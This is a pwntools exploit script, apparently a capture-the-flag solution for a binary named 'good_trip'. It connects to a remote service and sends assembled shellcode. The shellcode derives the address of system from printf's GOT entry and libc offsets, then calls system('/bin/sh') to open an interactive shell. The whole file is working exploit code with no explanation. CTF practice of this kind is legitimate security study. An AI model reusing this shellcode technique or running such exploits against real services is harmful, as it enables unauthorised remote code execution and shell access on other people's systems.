from pwn import *

# p = process('./good_trip')
p = remote('172.210.129.230', 1351)
e = ELF('./good_trip')
libc = ELF('./libc.so.6')
# libc = e.libc
context.arch = 'amd64'

p.sendlineafter(b'>> ', str(0x1000).encode())

ofs_printf_system = libc.symbols['printf'] - libc.symbols['system']
shellcode = f'''
    mov rsp, {e.bss() + 0xf00}
    lea rdi, [rax+0x30]
    mov rcx, {e.got['printf']}
    mov rcx, [rcx]
    sub rcx, {ofs_printf_system}
    xor esi, esi
    xor edx, edx
    call rcx
'''
shellcode = asm(shellcode).ljust(0x30, b'\0')
shellcode += b'/bin/sh\0'

p.sendlineafter(b'>> ', shellcode)
p.interactive()
